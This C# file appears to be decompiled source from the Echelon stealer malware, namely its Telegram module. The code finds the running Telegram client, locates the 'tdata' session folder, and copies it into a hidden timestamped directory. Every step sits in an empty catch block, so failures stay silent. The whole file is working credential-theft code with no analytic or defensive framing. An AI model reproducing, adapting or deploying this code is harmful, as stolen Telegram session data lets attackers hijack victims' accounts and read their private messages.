using System;
using System.Diagnostics;
using System.IO;

namespace Echelon.Stealer.Telegram
{
	// Token: 0x02000014 RID: 20
	public class Telegram
	{
		// Token: 0x06000032 RID: 50 RVA: 0x00003FA4 File Offset: 0x000021A4
		public static void GetTelegram(string Echelon_Dir)
		{
			try
			{
				Process[] processesByName = Process.GetProcessesByName("Telegram");
				if (processesByName.Length >= 1)
				{
					string text = Path.GetDirectoryName(processesByName[0].MainModule.FileName) + "\\tdata";
					if (Directory.Exists(text))
					{
						string toDir = Echelon_Dir + "\\Telegram_" + ((int)(DateTime.UtcNow - new DateTime(1970, 1, 1)).TotalSeconds).ToString();
						Telegram.CopyAll(text, toDir);
						Telegram.count++;
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000033 RID: 51 RVA: 0x00004060 File Offset: 0x00002260
		private static void CopyAll(string fromDir, string toDir)
		{
			try
			{
				Directory.CreateDirectory(toDir).Attributes = (FileAttributes.Hidden | FileAttributes.Directory);
				string[] array = Directory.GetFiles(fromDir);
				for (int i = 0; i < array.Length; i++)
				{
					Telegram.CopyFile(array[i], toDir);
				}
				array = Directory.GetDirectories(fromDir);
				for (int i = 0; i < array.Length; i++)
				{
					Telegram.CopyDir(array[i], toDir);
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000034 RID: 52 RVA: 0x000040E0 File Offset: 0x000022E0
		private static void CopyFile(string s1, string toDir)
		{
			try
			{
				string fileName = Path.GetFileName(s1);
				if (!Telegram.in_patch || fileName[0] == 'm' || fileName[1] == 'a' || fileName[2] == 'p')
				{
					string destFileName = toDir + "\\" + fileName;
					File.Copy(s1, destFileName);
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000035 RID: 53 RVA: 0x0000415C File Offset: 0x0000235C
		private static void CopyDir(string s, string toDir)
		{
			try
			{
				Telegram.in_patch = true;
				Telegram.CopyAll(s, toDir + "\\" + Path.GetFileName(s));
				Telegram.in_patch = false;
			}
			catch
			{
			}
		}

		// Token: 0x0400002C RID: 44
		public static int count;

		// Token: 0x0400002D RID: 45
		private static bool in_patch;
	}
}
